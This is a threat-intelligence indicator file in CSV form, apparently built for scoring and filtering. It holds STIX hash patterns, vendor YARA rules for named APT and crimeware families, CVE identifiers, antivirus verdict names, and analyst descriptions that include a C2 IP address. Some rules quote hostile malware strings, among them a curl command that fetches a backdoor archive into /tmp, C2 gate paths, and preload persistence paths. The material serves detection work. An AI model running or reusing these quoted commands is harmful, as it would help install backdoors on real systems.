indicator,type,description,Msbom,Mnetwork,Mmetadata,Score,Decision
[(file:name = 'update.exe') AND file:size = 137728 AND (file:hashes.MD5 = 'BCAC28919FA33704A01D7A9E5E3DDF3F' OR file:hashes.'SHA-1' = 'B1C0B42A6B64536DFB825A7A7B029A1C72060167' OR file:hashes.'SHA-256' = '1B88B939E5EC186B2D19AEC8F17792D493D74DD6AB3D5A6DDC42BFE78B01AFF1')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'Agni_co.exe') AND file:size = 178176 AND (file:hashes.MD5 = 'CDEAE978F3293F4E783761BC61B34810' OR file:hashes.'SHA-1' = '0768165C77D91993CA64F3AD9C756C0483CBC763' OR file:hashes.'SHA-256' = '6CA3C2A6001F1149FF75AB46402DEE40D97602BAB0B43AC144CA70FBD2101404')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'svchost.png') AND file:size = 56832 AND (file:hashes.MD5 = '0055A266AA536B2FDADB3336EF8D4FBA' OR file:hashes.'SHA-1' = '9B0156F0FA11A9ECD0F676727040763F157CBAE0' OR file:hashes.'SHA-256' = 'C28BB61DE4A6AD1C5E225AD9EC2EAF4A6C8CCFFF40CF45A640499C0ADB0D8740')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'netcorebios.dll') AND file:size = 2252800 AND (file:hashes.MD5 = '0ECF4BAC2B070CF40F0B17E18CE312E6' OR file:hashes.'SHA-1' = 'BAA104CB2C73289AB890A94D54C39DE7710EA1AA' OR file:hashes.'SHA-256' = '2B6BE5801BF2289523FBFB6AB059DD72808C4C074BAA5FD9A84A79F70AE536CB')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = '9112efb49cae021abebd3e9a564e6ca4.exe') AND file:size = 133120 AND (file:hashes.MD5 = '9112EFB49CAE021ABEBD3E9A564E6CA4' OR file:hashes.'SHA-1' = '0F3B24E4E3E44BF60C5AAD5B457FD8E0F6836C29' OR file:hashes.'SHA-256' = '7339CFA5A67F5A4261C18839EF971D7F96EAF60A46190CAB590B439C71C4742B')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'c892c60817e6399f939987bd2bf5dee0.exe') AND file:size = 41472 AND (file:hashes.MD5 = 'C892C60817E6399F939987BD2BF5DEE0' OR file:hashes.'SHA-1' = '4A0507273603C8DFCFAA44724CD348179B90E02E' OR file:hashes.'SHA-256' = '9AC31CE26749874B8F9E080CBE10E6D9C4D0FA9C8EDB17685291E031D7F82949')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = '1ffccc23fef2964e9b1747098c19d956') AND file:size = 143360 AND (file:hashes.MD5 = '1FFCCC23FEF2964E9B1747098C19D956' OR file:hashes.'SHA-1' = 'A100DAA33D7DB6D2424AC1A8C9EC4B3AE8A3105C' OR file:hashes.'SHA-256' = '3098E6E7AE23B3B8637677DA7BFC0BA720E557E6DF71FA54A8EF1579B6746061')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'mstcs.exe') AND file:size = 143360 AND (file:hashes.MD5 = '0A09B7F2317B3D5F057180BE6B6D0755' OR file:hashes.'SHA-1' = 'DFE5D75ED31B6CFC2CCEEBB1404D3EABC02F0021' OR file:hashes.'SHA-256' = '8DAA6B20CAF4BF384CC7912A73F243CE6E2F07A5CB3B3E95303DB931C3FE339F')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = '0211a3160cc5871cbcd4e5514449162b.exe') AND file:size = 41984 AND (file:hashes.MD5 = '0211A3160CC5871CBCD4E5514449162B' OR file:hashes.'SHA-1' = '393EC0051C457F199C406D5771D276754FA29E3B' OR file:hashes.'SHA-256' = '5758765A59ABFDF5E255DF4D0447F92132891D1B325FAAA2FB155EBB41CBA818')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'ac0ada011f1544aa3a1cf27a26f2e288.exe') AND file:size = 41984 AND (file:hashes.MD5 = 'AC0ADA011F1544AA3A1CF27A26F2E288' OR file:hashes.'SHA-1' = 'D27F94701C8F588748EE9115B194E4664990969C' OR file:hashes.'SHA-256' = 'E830C677D51668133FBEA5D900B7A8E0D8CDFED0A396F50BE314C0591BF71F74')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'troyserver.exe') AND file:size = 3912704 AND (file:hashes.MD5 = 'B697B81B341692A0B137B2C748310EA7' OR file:hashes.'SHA-1' = '3173031BF8B3ED00863AA5A4FDB6E21EF8089B22' OR file:hashes.'SHA-256' = '6E9D8C4973034BEA0FBF99902002601D50B0512C96F09260784CFCEC822B974A')],stix2-pattern,,1,1,0,0.9,Push
[(file:name = 'TrollController.exe') AND file:size = 690176 AND (file:hashes.MD5 = '61A949553D35F31957DB6442F36730C5' OR file:hashes.'SHA-1' = '74B37080ADF8482D25917F1823EB02AA04A2659C' OR file:hashes.'SHA-256' = 'C213B0FD564D5900E99848C591699949308EF3160C823DE12A7E7446474ABBBB')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'jd-gui.exe') AND file:size = 374272 AND (file:hashes.MD5 = '97CE00C7EF1F7D98B48291D73D900181' OR file:hashes.'SHA-1' = '232106CBC0FEB6AEAB2816A6535E81A0FA16243B' OR file:hashes.'SHA-256' = '7F904D16371B40E24495D9CC91019A54A3F257129896DB1698282A187DFD8808')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = '05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d') AND (file:hashes.MD5 = '82491B42B9A2D34B13137E36784A67D7' OR file:hashes.'SHA-1' = '1DF16F8BB6068E5F65F0A9A3613CC31FE5321A8D' OR file:hashes.'SHA-256' = '05E9FE8E9E693CB073BA82096C291145C953CA3A3F8B3974F9C66D15C1A3A11D')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'load.html') AND file:size = 481 AND (file:hashes.MD5 = '3D2EC58F37C8176E0DBCC47FF93E5A76' OR file:hashes.'SHA-1' = 'EE11F6ECFD03105E79B4AC44CA8583C71842B1CF' OR file:hashes.'SHA-256' = 'B2CEC2D6992BF41D2BAB643968691E06722F830FC38F7776238FE88A1F892404')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'c2f8c9bb7df688d0a7030a96314bb493') AND file:size = 444928 AND (file:hashes.MD5 = 'C2F8C9BB7DF688D0A7030A96314BB493' OR file:hashes.'SHA-1' = '6870BF00619DF57B3AE2649EEAB79703FDA9DD90' OR file:hashes.'SHA-256' = '9F90670D2197496F7D9D20152FE822238D9806716BAF55C0078EEF937DC8DFDB')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'load.html') AND file:size = 568 AND (file:hashes.MD5 = 'DC70DC9845AA747001EBF2A02467C203' OR file:hashes.'SHA-1' = '58FEFD5876654FB51534B21C2F486EBFB1ACBAE7' OR file:hashes.'SHA-256' = '17085EF59C256AABAE656311399575CEB2CF7E2E904255AC4C920FAB9D5215E1')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'fe25c192875ec1914b8880ea3896cda2') AND file:size = 156672 AND (file:hashes.MD5 = 'FE25C192875EC1914B8880EA3896CDA2' OR file:hashes.'SHA-1' = '3735C87DAEE192DFCFB265E3858E15BB9E4066EC' OR file:hashes.'SHA-256' = '4A87FC2F9DA25152BF26FFF375DD9A18E81EEB78C2B5C5BABCC04DC93371D0AA')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = '13b4ce1fc26d400d34ede460a8530d93') AND file:size = 169984 AND (file:hashes.MD5 = '13B4CE1FC26D400D34EDE460A8530D93' OR file:hashes.'SHA-1' = '66033BC4A2EC00857453698F82D8087A867D7FB7' OR file:hashes.'SHA-256' = '048698159BBB051AF779D22EB5B1282CE895E8311D641D50CC23CBFD36CC020A')],stix2-pattern,,0,1,0,0.3,Filter
[(file:name = 'nslookup.exe') AND file:size = 4773376 AND (file:hashes.MD5 = '073E3170A8E7537FF985EC8316319351' OR file:hashes.'SHA-1' = '6496A429B2090607EDEDBC9B12FDECD5AA8731A9' OR file:hashes.'SHA-256' = '3D4EE28DD88E4F9A6647789EDBFAC38DD99821CA1BDCB6FE1D3DF6DC80287462')],stix2-pattern,,0,1,0,0.3,Filter
"rule apt_MuddyWater_malicious_pdf {

    meta:

        id = ""77983aea-47cb-4436-b773-faf7be430339""

        version = ""1.0""

        intrusion_set = ""MuddyWater""

        description = ""Detects malicious PDF used by MuddyWater""

        source = ""Sekoia.io""

        creation_date = ""2024-06-10""

        classification = ""TLP:WHITE""

    strings:

        $ = ""egnyte.com/fl/""

        $ = ""/Type/Pages/Count 1""

    condition:

        uint32be(0) == 0x25504446 and

        filesize < 300KB and

        all of them

}",yara,,0,1,0,0.3,Filter
"rule apt_MuddyWater_MuddyRot_strings {

  meta:

        id = ""f7bc195a-0e60-4495-b78a-78f101543700""

        version = ""1.0""

        malware = ""MuddyRot""

        intrusion_set = ""MuddyWater""

        description = ""Detects RotRot backdoor based on strings permutations""

        source = ""Sekoia.io""

        creation_date = ""2024-06-10""

        classification = ""TLP:WHITE""

  strings:

    $s1 = ""qsphsbnebub""

    $s2 = ""rtqitcofcvc""

    $s3 = ""surjudpgdwd""

    $s4 = ""tvskveqhexe""

    $s5 = ""uwtlwfrifyf""

    $s6 = ""vxumxgsjgzg""



    $t1 = ""MpbeMjcsbs""

    $t2 = ""NqcfNkdtct""

    $t3 = ""OrdgOleudu""

    $t4 = ""PsehPmfvev""

    $t5 = ""QtfiQngwfw""

    $t6 = ""RugjRohxgx""



    $u1 = ""UfsnjobufKpcPckfdu""

    $u2 = ""VgtokpcvgLqdQdlgev""

    $u3 = ""WhuplqdwhMreRemhfw""

    $u4 = ""XivqmrexiNsfSfnigx""

    $u5 = ""YjwrnsfyjOtgTgojhy""

    $u6 = ""ZkxsotgzkPuhUhpkiz""



  condition:

    uint16be(0) == 0x4d5a and

    filesize > 100KB and filesize < 300KB and

    any of ($s*) and any of ($t*) and any of ($u*)

}",yara,,0,1,0,0.3,Filter
"rule NikiHTTP

{

meta:

	description = ""Identifies NikiHTTP, a versatile backdoor by (likely) Kimsuky.""

	author = ""@bartblaze, @nsquar3""

	date = ""2024-06""

	tlp = ""White""

	hash_a = ""3314b6ea393e180c20db52448ab6980343bc3ed623f7af91df60189fec637744""

	hash_b = ""c94a5817fcd6a4ea93d47d70b9f2b175923a8b325234a77f127c945ae8649874""

	reference = ""https://cyberarmor.tech/new-north-korean-based-backdoor-packs-a-punch/""



strings:

	$cmd = {4? 8d 0d be 2f 03 00 4? 85 c0 4? 8d 15 8c 2f 03 00}

	$str_1 = ""%s%sc %s >%s 2>&1"" ascii wide

	$str_2 = ""%s%sc %s 2>%s"" ascii wide

	$str_3 = ""%s:info"" ascii wide

	

	//D:\02.data\03.atk-tools\engine\niki\httpSpy\..\bin\httpSpy.pdb

	$pdb_full = ""\\02.data\\03.atk-tools\\"" ascii wide

	$pdb_httpspy = ""\\bin\\httpSpy.pdb"" ascii wide

		

	$code = { 0f 57 c0 4? 89 7? ?? 33 c0 c7 4? ?? 68 00 00 00 0f 11 4? ?? c7 4? ?? 01 00 00 00 66 4? 89 7? 00 0f 11 4? ?? 4? 89 4? ?? 0f 11 4? ?? c7 44 ?? ?? 53 71 80 60 0f 11 4? ?? c7 44 ?? ?? 71 79 7c 5c 0f 11 4? ?? c7 44 ?? ?? 6d 80 74 63 0f 11 4? ?? 88 44 ?? ?? 0f 11 4? ?? 0f 1f 44 00 00 }



condition:

	uint16(0) == 0x5A4D and (

	$cmd or (2 of ($str_*)) or

	any of ($pdb_*) or $code

	)

}",yara,,0,1,0,0.3,Filter
"rule NikiGo

{

meta:

	description = ""Identifies NikiGo, a Go dropper by (likely) Kimsuky.""

	author = ""@bartblaze, @nsquar3""

	date = ""2024-06""

	tlp = ""White""

	hash = ""000e2926f6e094d01c64ff972e958cd38590299e9128a766868088aa273599c7""

	reference = ""https://cyberarmor.tech/new-north-korean-based-backdoor-packs-a-punch/""



strings:

	$go = ""Go build ID:""



	$func1 = ""main.ParseCommandLine"" ascii wide fullword

	$func2 = ""main.RunCmd"" ascii wide fullword

	$func3 = ""main.HttpGet"" ascii wide fullword

	$func4 = ""main.SelfDel"" ascii wide fullword

	$func5 = ""main.RandomBytes"" ascii wide fullword



	$pdb_src = ""C:/Users/niki/go/src/niki/auxiliary/engine-binder/main.go"" ascii wide

	$pdb_path = ""/Users/niki/go/src/niki/auxiliary/engine-binder/"" ascii wide

	

condition:

	uint16(0) == 0x5A4D and $go and (

	all of ($func*) or

	any of ($pdb*)

	)

}",yara,,0,1,0,0.3,Filter
"import ""pe""

rule NikiCert

{

meta:

	description = ""Identifies Nexaweb digital certificate used in (likely) Kimsuky campaign.""

	author = ""@bartblaze, @nsquar3""

	date = ""2024-06""

	tlp = ""White""

	hash_a = ""cca1705d7a85fe45dce9faec5790d498427b3fa8e546d7d7b57f18a925fdfa5d""

	hash_b = ""000e2926f6e094d01c64ff972e958cd38590299e9128a766868088aa273599c7""

	reference = ""https://cyberarmor.tech/new-north-korean-based-backdoor-packs-a-punch/""



condition:

	uint16(0) == 0x5A4D and

    for any i in (0 .. pe.number_of_signatures) : (

		pe.signatures[i].serial == ""03:15:e1:37:a6:e2:d6:58:f0:7a:f4:54:c6:3a:0a:f2""

    )

}",yara,,0,1,0,0.3,Filter
e48c250c47dd071dcee984a8e9f27b170004ff81c3f0da6a50364fdecf800fd3,x509-fingerprint-sha256,,0,0,0,0.0,Filter
"import ""pe""

rule apt_MustangPanda_MaliciousDLL_random_exports {

    meta:

        id = ""d14ae417-bc6f-40b1-a027-084522fce516""

        version = ""1.0""

        intrusion_set = ""MustangPanda""

        description = ""Detects malicious DLL used by MustangPanda""

        source = ""Sekoia.io""

        classification = ""TLP:WHITE""

    strings: 

    	$trait = { 66 89 55 FC } 

    condition: 

    	pe.is_dll() and filesize < 100KB and 

        for any e in pe.export_details: (

        	$trait in (e.offset..e.offset+50)

            and e.name matches /^[a-z]{10,}$/

        )

        and not pe.is_signed

}",yara,,0,1,0,0.3,Filter
"rule apt_MustangPanda_PlugXWorm_lnk {

    meta:

        id = ""bea0b6e6-0999-431d-8ea2-324aa7497657""

        version = ""1.0""

        malware = ""PlugXWorm""

        intrusion_set = ""MustangPanda""

        description = ""Detects PlugXWorm Malicious LNK""

        source = ""Sekoia.io""

        classification = ""TLP:WHITE""

    strings:

        $ = ""RECYCLER.BIN\\1\\CEFHelper.exe"" wide

    condition:

        uint32be(0) == 0x4c000000 

        and filesize < 2KB

        and all of them 

}",yara,,0,1,0,0.3,Filter
CVE-2024-20359,vulnerability,,0,0,0,0.0,Filter
CVE-2024-20353,vulnerability,,0,0,0,0.0,Filter
RotBot and XClient Stealer,text,RotBot and XClient Stealer attribute,0,0,0,0.0,Filter
CoralRaider,threat-actor,Threat actor for RotBot and XClient stealer,0,0,0,0.0,Filter
"rule M_APT_Downloader_WINELOADER_2



{



    meta:



        author = ""Mandiant""



        disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment.""



        description = ""Detects payload invocation stub in WINELOADER""



 



    strings:



        // 48 8D 0D ?? ?? 00 00  lea rcx, module_start (Pointer to encrypted resource)



        // 48 C7 C2 ?? ?? 00 00  mov rdx, ???? (size of encrypted source)



        // E8 [4]  call decryption



        // 48 8D 05 [4]  lea rcx, ??



        // 48 8D 0D [4]  lea rax, module_start (decrypted resource)



        // 48 89 05 [4]  mov ptr_mod, rax



        //



        $ = {48 8D 0D ?? ?? 00 00 48 C7 C2 ?? ?? 00 00 E8 [4] 48 8d 0D [4] 48 8D 05 [4] 48 89 05 }



 



    condition:



        all of them



}",yara,,0,1,0,0.3,Filter
"rule M_APT_Downloader_WINELOADER_1



{



    meta:



        author = ""Mandiant""



        disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment.""



        description = ""Detects rc4 decryption logic in WINELOADER samples""



 



    strings:



        $ = {B9 00 01 00 00 99 F7 F9 8B 44 24 [50-200] 0F B6 00 3D FF 00 00 00} // Key initialization



        $ = {0F B6 00 3D FF 00 00 00} // Key size



 



    condition:



        all of them



 



}",yara,,0,1,0,0.3,Filter
"rule M_APT_Dropper_Rootsaw_Obfuscated



{



    meta:



        author = ""Mandiant""



        disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment.""



        description = ""Detects obfuscated ROOTSAW payloads""



 



    strings:



        $ = ""function _""



        $ = ""new XMLHttpRequest();""



        $ = ""'\\x2e\\x7a\\x69\\x70'""



        $ = ""'\\x4f\\x70\\x65\\x6e'""



        $ = ""\\x43\\x3a\\x5c\\x57""



 



    condition: 



        all of them



}",yara,,0,1,0,0.3,Filter
waterforvoiceless[,text,,0,0,0,0.0,Filter
/invite.php,text,,0,0,0,0.0,Filter
]org,text,,0,0,0,0.0,Filter
"rule u42_crime_win_bunnyloader_%WINDIR%\memory

{

 meta:

  author = ""Unit 42 Threat Intelligence""

  date = ""2024-02-28""

  description = ""Detects Bunnyloader 3.0, a loader with additional capabilities including keylogger, stealer, clipper, and DoS modules.""

  hash1 = ""c80a63350ec791a16d84b759da72e043891b739a04c7c1709af83da00f7fdc3a""

  malware_family = ""bunnyloader""





 strings:

  $x1 = ""Windows Defender"" fullword ascii

  $x2 = ""ONLINE"" fullword ascii

  $x3 = ""Blacklisted"" fullword ascii

  $x4 = ""ESET NOD32"" fullword ascii

  $x5 = ""McAffee"" fullword ascii

  $x6 = ""SecurityCenter2 path AntiVirusProduct get displayName"" fullword ascii

  $cc1 = ""&va_enc_key="" fullword ascii

  $cc2 = ""&value="" fullword ascii

  $cc3 = ""&arch="" fullword ascii

  $cc4 = ""&system="" fullword ascii

  $cc5 = ""&hostname"" fullword ascii

  $cc6 = ""&DBID_enc_key="" fullword ascii

  $cc7 = ""/gate.php?DBID="" fullword ascii

  $cc8 = ""/gate.php?DCID="" fullword ascii

  $cc9 = ""(ID|Layer|Windows_Argument)"" ascii





 condition:

  all of them

}",yara,,0,1,0,0.3,Filter
CVE-2023-35636,vulnerability,,0,0,0,0.0,Filter
CVE-2023-23397,vulnerability,,0,0,0,0.0,Filter
CVE-2024-21410,vulnerability,,0,0,0,0.0,Filter
CVE-2024-21413,vulnerability,,0,0,0,0.0,Filter
CVE-2024-21887,vulnerability,,0,0,0,0.0,Filter
CVE-2024-21412,vulnerability,,0,0,0,0.0,Filter
CVE-2023-5631,vulnerability,,0,0,0,0.0,Filter
STIX 2.1,text,,0,0,0,0.0,Filter
CVE-2023-38831,vulnerability,,0,0,0,0.0,Filter
pravdaencom,text,,0,0,0,0.0,Filter
pravdafrcom,text,,0,0,0,0.0,Filter
rsa,text,,0,0,0,0.0,Filter
2048,text,,0,0,0,0.0,Filter
385f98b9d3eb73751235cf1fda6bfe5c9c133bb7,x509-fingerprint-sha1,,0,0,0,0.0,Filter
6a4d9f7c3d862a1e9d019f0fb981b84884e72c52b63473d2b5e8ae430ffacab0,x509-fingerprint-sha256,,0,0,0,0.0,Filter
/CN=localhost,text,,0,0,0,0.0,Filter
sha256WithRSAEncryption,text,,0,0,0,0.0,Filter
666805504220290363286482534169636286915339921122,text,,0,0,0,0.0,Filter
W64/Agent.FXW.gen!Eldorado,text,,0,0,0,0.0,Filter
varist,text,,0,0,0,0.0,Filter
App/FRProxy-F,text,,0,0,0,0.0,Filter
Trojan.WinGo.Shellcoderunner,text,,0,0,0,0.0,Filter
Generic.Trojan.Volt.Marte.A.105C517F (B),text,,0,0,0,0.0,Filter
emsisoft,text,,0,0,0,0.0,Filter
a variant of WinGo/Riskware.Frp.U application,text,,0,0,0,0.0,Filter
eset,text,,0,0,0,0.0,Filter
bitdefender,text,,0,0,0,0.0,Filter
GrayWare/Win32.Kryptik.ffp,text,,0,0,0,0.0,Filter
antiy,text,,0,0,0,0.0,Filter
HackTool/Win.Frpc,text,,0,0,0,0.0,Filter
ahnlab,text,,0,0,0,0.0,Filter
Generic.Trojan.Volt.Marte.A.105C517F,text,,0,0,0,0.0,Filter
adaware,text,,0,0,0,0.0,Filter
trojan,text,,0,0,0,0.0,Filter
"This artifact is a command-line port scanning utility from Foundstone, Inc. called ScanLine, which is packed using UPX. It is used to scan for open UDP and TCP ports, grab banners from open ports, resolve IP addresses to host names, and bind to specified ports and IP addresses.",text,,0,1,0,0.3,Filter
Tool.Portscan.Win32.77,text,,0,0,0,0.0,Filter
zillya,text,,0,0,0,0.0,Filter
webrootsmd,text,,0,0,0,0.0,Filter
Trojan.Genome.fl,text,,0,0,0,0.0,Filter
virusblokada,text,,0,0,0,0.0,Filter
App/ScanLn-A,text,,0,0,0,0.0,Filter
sophos,text,,0,0,0,0.0,Filter
scrutiny,text,,0,0,0,0.0,Filter
Trojan.Win32,text,,0,0,0,0.0,Filter
quickheal,text,,0,0,0,0.0,Filter
Riskware.Win32.ScanLine.dhhus,text,,0,0,0,0.0,Filter
nanoav,text,,0,0,0,0.0,Filter
Malware,text,,0,0,0,0.0,Filter
microsoftdefender,text,,0,0,0,0.0,Filter
Unavailable (production),text,,0,0,0,0.0,Filter
mcafee,text,,0,0,0,0.0,Filter
Virtool,text,,0,0,0,0.0,Filter
ikarus,text,,0,0,0,0.0,Filter
Hacktool.ScanLine.a.fsff,text,,0,0,0,0.0,Filter
unknown,text,,0,0,0,0.0,Filter
filseclab,text,,0,0,0,0.0,Filter
cylance,text,,0,0,0,0.0,Filter
ApplicUnwnt,text,,0,0,0,0.0,Filter
comodo,text,,0,0,0,0.0,Filter
Win.Trojan.Scanline-1,text,,0,0,0,0.0,Filter
clamav,text,,0,0,0,0.0,Filter
HackTool[NetTool]/Win32.Portscan,text,,0,0,0,0.0,Filter
Unwanted/Win32.Foundstone,text,,0,0,0,0.0,Filter
"This artifact is a cross platform full featured FRP that is written in GO language (Golang) and packed using Ultimate Packer for Executables (UPX). This utility can be used to locate servers behind a network firewall or obscured through NAT. It includes the KCP (no acronym) network protocol that allows for error-checked and anonymous delivery of data streams using the User Datagram Protocol (UDP) with packet level encryption support.



The program contains two different multiplexer libraries that can bi-directionally stream data over a NAT’d network. It also contains a command line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh). In addition, the utility features a unique capability that detects if the utility is executed from the command line or by double-clicking. 



By default it is configured to connect to the Internet Protocol (IP) address, 203.95.8.98 on Transmission Control Protocol (TCP) port 1080. It must receive a specially formed packet from the C2 for the utility to deploy on the system.",text,,1,1,0,0.9,Push
Trojan.WinGo.Rozena,text,,0,0,0,0.0,Filter
Generic.Trojan.Volt.Marte.A.05F91E9C (B),text,,0,0,0,0.0,Filter
a variant of WinGo/HackTool.Agent.Y trojan,text,,0,0,0,0.0,Filter
Generic.Trojan.Volt.Marte.A.05F91E9C,text,,0,0,0,0.0,Filter
system,text,,0,0,0,0.0,Filter
Cybersecurity and Infrastructure Security Agency Production Identity. Code and Media Analysis.,text,,0,0,0,0.0,Filter
GeminiProduction_CMA,text,,0,1,0,0.3,Filter
"rule u42_crime_win_mispadu

{

    meta:

        author = ""Unit 42 Threat Intelligence""

        date = ""2023-12-15""

        description = ""Identifies the infostealer malware family associated with the Mispadu threat, which is responsible for targeting specific domains within a victim's browser history.""

        hash1 = ""8e1d354dccc3c689899dc4e75fdbdd0ab076ac457de7fb83645fb735a46ad4ea""

        hash2 = ""30b4ab9707347c6bdd9035d1562cab31c78a27f5ad410871cadffeb208cd85e8""

        reference = ""https://malpedia.caad.fkie.fraunhofer.de/details/win.mispadu""

        malware_family = ""mispadu""

 

    strings:

        $str1 = {687474703A2F2F0068747470733A2F2F00000000000000007B003A003000380078007D00000000002E2F0000000000004D6F7A696C6C612F352E30202857696E646F7773204E542031302E303B2054726964656E742F372E303B2072763A31312E3029206C696B65204765636B6F00005300480041003200350036000000000052746C47657456657273696F6E00}

        $str2 = {424372797074456E6372797074000000424372797074436C6F7365416C676F726974686D50726F76696465720000000043003A005C00570069006E0064006F00770073005C00530079007300740065006D003300320000005C00540065006D00700000000000000043003A005C00500072006F006700720061006D0044006100740061005C00540065006D00700000002C00000000000000554E4B4E4F574E007C0000003D000000687474703A2F2F0068747470733A2F2F00}

        $str3 = {6E00740064006C006C002E0064006C006C0000000000000057696E646F777320313100000000000057696E646F777320313000000000000057696E646F777320380000000000000057696E646F7773203700000000000000556E6B6E6F776E00410045005300000043006800610069006E0069006E0067004D006F00640065004300420043000000}

 

    condition:

        any of them

}",yara,,0,1,0,0.3,Filter
CVE-2023-36025,vulnerability,,0,0,0,0.0,Filter
CVE-2022-42475,vulnerability,,0,0,0,0.0,Filter
"rule COATHANGER_beacon

{

    meta:

        description = ""Detects COATHANGER beaconing code (GET / HTTP/2\nHost: www.google.com\n\n)""

        malware = ""COATHANGER""

        author = ""NLD MIVD - JSCU""

        date = ""20240206""

    strings:

        $chunk_1 = {

            48 B8 47 45 54 20 2F 20 48 54

            48 89 45 B0

            48 B8 54 50 2F 32 0A 48 6F 73

            48 89 45 B8

            48 B8 74 3A 20 77 77 77 2E 67

            48 89 45 C0

            48 B8 6F 6F 67 6C 65 2E 63 6F

        }



    condition:

        uint32(0) == 0x464c457f and filesize < 5MB and

        any of them

}",yara,,0,1,0,0.3,Filter
"rule COATHANGER_files

{

    meta:

        description = ""Detects COATHANGER files by used filenames""

        malware = ""COATHANGER""

        author = ""NLD MIVD - JSCU""

        date = ""20240206""

    strings:

        $1 = ""/data2/""

        $2 = ""/httpsd""

        $3 = ""/preload.so""

        $4 = ""/authd""

        $5 = ""/tmp/packfile""

        $6 = ""/smartctl""

        $7 = ""/etc/ld.so.preload""

        $8 = ""/newcli""

        $9 = ""/bin/busybox""



    condition:

        (uint32(0) == 0x464c457f or uint32(4) == 0x464c457f)

        and filesize < 5MB and 4 of them

}",yara,,0,1,0,0.3,Filter
"rule Backdoor_Linux_CommandoCat_tshd {

	meta:

        description = ""Detects CommandoCat tshd TinyShell registration script""

        license = ""Apache License 2.0""

        date = ""2024-01-25""

        hash1 = ""65c6798eedd33aa36d77432b2ba7ef45dfe760092810b4db487210b19299bdcb""

    strings:

        // Constants

        $const1 = ""SRCURL""

        $const2 = ""HOME""

        $const3 = ""TSHDPID""



        // Functions

        $func1 = ""setuptools()""

        $func2 = ""hidfile()""

        $func3 = ""hidetshd()""



        // Paths

        $path1 = ""/var/tmp""

        $path2 = ""/bin/hid""

        $path3 = ""/etc/mtab""

        $path4 = ""/dev/shm/..tshdpid""

        $path5 = ""/tmp/.tsh.tar.gz""

        $path6 = ""/usr/sbin/tshd""

        $path7 = ""/usr/foo""

        $path8 = ""./tshd""



        // General

        $str1 = ""curl -Lk $SRCURL/bin/tsh/tsh.tar.gz -o /tmp/.tsh.tar.gz""

        $str2 = ""find /dev/shm/ -type f -size 0 -exec rm -f {} \\;""



    condition:

        filesize < 1MB and

        all of them        

}",yara,,0,1,0,0.3,Filter
